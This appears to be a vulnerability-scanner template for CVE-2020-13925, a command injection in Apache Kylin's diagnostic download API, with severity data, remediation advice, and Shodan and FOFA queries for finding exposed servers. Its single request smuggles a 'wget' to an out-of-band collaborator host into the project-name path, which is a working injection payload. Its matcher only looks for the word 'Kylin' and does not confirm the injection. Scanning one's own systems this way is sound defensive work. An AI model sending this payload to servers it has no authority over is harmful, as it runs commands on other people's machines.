id: CVE-2020-13925

info:
  name: Apache Kylin Command Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Apache Kylin is vulnerable to remote command execution due to improper input validation in the diagnostic download API. Attackers can execute arbitrary commands by manipulating the project name parameter.
  impact: |
    Successful exploitation could lead to remote code execution and compromise of the server.
  remediation: |
    Upgrade to Apache Kylin version 3.0.1 or later to mitigate CVE-2020-13925.
  reference:
    - https://lists.apache.org/thread.html/r021baf9d8d4ae41e8c8332c167c4fa96c91b5086563d9be55d2d7acf%40%3Ccommits.kylin.apache.org%3E
    - https://github.com/Miraitowa70/POC-Notes
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/Coldplay1517/Middleware-Vulnerability-detection-master
    - https://github.com/J1ezds/Vulnerability-Wiki-page
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-13925
    cwe-id: CWE-78
    epss-score: 0.0045
    epss-percentile: 0.75852
    cpe: cpe:2.3:a:apache:kylin:*:*:*:*:*:*:*:*
  metadata:
    vendor: apache
    product: kylin
    shodan-query: http.favicon.hash:-186961397
    fofa-query:
      - app="apache-kylin"
      - icon_hash=-186961397

http:
  - method: GET
    path:
      - "{{BaseURL}}/kylin/api/diag/project/||wget h1j96qoac5o9mbqpkewkhxxa218rwg.burpcollaborator.net||/download"

    matchers:
      - type: word
        words:
          - "Kylin"
        part: body
